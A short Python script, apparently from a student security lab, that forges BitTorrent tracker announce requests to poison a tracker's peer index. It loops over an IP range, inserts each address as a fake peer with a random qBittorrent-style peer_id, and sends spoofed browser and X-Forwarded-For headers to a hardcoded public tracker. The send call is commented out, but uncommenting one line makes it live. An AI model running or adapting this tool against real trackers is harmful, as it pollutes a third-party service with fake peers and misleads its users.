from scapy.all import *

import random
import string
# coding:utf-8
from urllib import request
from urllib import parse
class send_pollution:


    # def send_udp_announce(self, dst):
    #     eth = Ether()
    #     IPlayer = IP( dst=dst)
    #     UDPlayer = UDP(sport=54066, dport = 80)
    #     # with open("D:\JuniorSpring\信息内容安全\contentSecurityLab\\test\\"+dst+".txt","rb") as f:
    #     #     data = f.read()
    #     # ip_addr = "45.168.249.205"
    #     # ip = socket.inet_aton(ip_addr)
    #     # data = exchange_bytes(bytearray(data), 84, 4, bytearray(ip))
    #     # peer_id_array = bytearray(os.urandom(20))
    #     # data = exchange_bytes(bytearray(data), 36, 20, peer_id_array)
    #     data = '123435'
    #     pkt = IPlayer / UDPlayer / data
    #     send(pkt)

    def send_http_announce(self, tracker_ip, tracker_port, min_ip, max_ip, port, output_text):
        '''
        min_ip -> (4, 3, 2, 1)

        :param dst:
        :param min_ip:
        :return:
        '''
        while self.bigger(max_ip,min_ip):
            newip = str(min_ip[0]) + "." + str(min_ip[1]) + "." + str(min_ip[2]) + "." + str(min_ip[3])
            peer_id = '-qB4250-' + generate_random_str(12)
            url = "http://93.158.213.92:1337/announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id=" + peer_id + "&ip=" + newip + "&port="+port+"&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0HTTP/1.1\r\n"
            fake_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0',
                'Accept': '*/*',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'X-Forwarded-For': '1.1.1.1'
            }
            request_announce = request.Request(url=url, headers=fake_headers)
            print(url)
            output_text.append("对tracker添加IP为"+newip+"的索引污染")
            # response_announce = request.urlopen(request_announce)
            for i in range(3, -1, -1):
                if min_ip[i] < 255:
                    min_ip[i] = min_ip[i]+1
                    break


    def bigger(self, ip1, ip2):
        for i in range(4):
            if ip1[i] > ip2[i]:
                return True
            elif ip1[i] < ip2[i]:
                return False

def generate_random_str(randomlength=16):
    """
    生成一个指定长度的随机字符串，其中
    string.digits=0123456789
    string.ascii_letters=abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
    """
    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]
    random_str = ''.join(str_list)
    return random_str


if __name__ == '__main__':
    send_pollution().send_http_announce('93.158.213.92', '1337', [200, 200, 200, 0], [200, 200, 200, 200], '50000', ["ds"])

